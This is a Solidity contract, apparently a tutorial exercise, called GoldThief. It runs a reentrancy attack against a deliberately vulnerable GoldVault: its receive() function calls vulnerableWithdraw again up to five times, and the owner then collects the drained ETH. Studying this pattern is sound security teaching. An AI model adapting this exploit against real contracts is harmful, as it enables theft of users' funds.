// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Day20-1-GoldVault.sol";

contract GoldThief {
    GoldVault public vault;
    uint256 public attackCount;
    uint256 public maxAttacks = 5;
    address public owner;

    event AttackStep(uint256 step, uint256 amount);

    constructor(address _vault) {
        vault = GoldVault(_vault);
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    // 发起攻击
    function attack() external payable onlyOwner {
        require(msg.value > 0, "Need ETH");

        vault.deposit{value: msg.value}();
        attackCount = 0;

        vault.vulnerableWithdraw();
    }

    // fallback触发重入
    receive() external payable {
        if (attackCount < maxAttacks && address(vault).balance > 0) {
            attackCount++;
            emit AttackStep(attackCount, msg.value);

            vault.vulnerableWithdraw();
        }
    }

    // 提现
    function withdraw() external onlyOwner {
        (bool success, ) = payable(owner).call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }
}